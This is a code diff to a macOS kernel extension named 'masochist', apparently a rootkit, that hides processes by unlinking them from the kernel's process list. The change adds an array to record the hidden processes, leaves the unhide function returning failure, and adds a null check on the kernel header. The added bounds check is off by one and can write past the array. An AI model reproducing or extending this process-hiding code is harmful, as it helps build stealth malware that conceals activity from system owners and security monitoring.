@@ -20,7 +20,11 @@ kern_return_t masochist_stop(kmod_info_t *ki, void *d);
 #define SLIDE 0x0
 #define KERNEL_BASE (0xffffff8000200000 + SLIDE) /* use slide.c */
 
-struct mach_header_64 *kernel_header = 0x0;
+#define MAX_HIDDEN_PROCS 100
+struct proc *hiddenProcs[MAX_HIDDEN_PROCS];
+unsigned int hiddenCount = 0;
+
+struct mach_header_64 *kernel_header = NULL;
 
 void *
 find_symbol(const char *symbol) {
@@ -130,8 +134,13 @@ hideProcess(pid_t pid) {
             /* Lock the process list before we modify it */
             proc_list_lock();
             
-            /* Actually remove the process. */
+            /* Actually hdie the process. */
             LIST_REMOVE(process, p_list);
+            
+            if(hiddenCount <= MAX_HIDDEN_PROCS) {
+                hiddenProcs[hiddenCount] = process;
+                hiddenCount++;
+            }
             
             /* Unlock the list */
             proc_list_unlock();
@@ -148,7 +157,7 @@ hideProcess(pid_t pid) {
 kern_return_t
 showProcess(pid_t process) {
     
-    return KERN_SUCCESS;
+    return KERN_FAILURE;
 }
 
 kern_return_t
@@ -156,6 +165,10 @@ masochist_start(kmod_info_t * ki, void *d) {
     
     /* Get the mach header of the kernel */
     kernel_header = (struct mach_header_64 *)KERNEL_BASE;
+    
+    /* No panic is better */
+    if(!kernel_header)
+        return KERN_FAILURE;
     
     /*
      
